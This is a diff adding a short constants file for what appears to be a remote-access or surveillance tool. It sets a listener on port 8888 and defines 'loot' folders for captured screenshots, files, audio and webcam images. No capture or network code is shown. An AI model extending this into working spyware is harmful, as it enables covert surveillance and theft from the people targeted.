@@ -1,0 +1,11 @@
+DEFAULT_HOST = "0.0.0.0"
+DEFAULT_CLIENT_HOST = "127.0.0.1"
+DEFAULT_PORT = 8888
+
+SOCKET_TIMEOUT = 30
+CHUNK_SIZE = 65536
+
+SCREENSHOTS_DIR = "loot/screenshots"
+FILES_DIR = "loot/files"
+AUDIO_DIR = "loot/audio"
+WEBCAM_DIR = "loot/webcam"
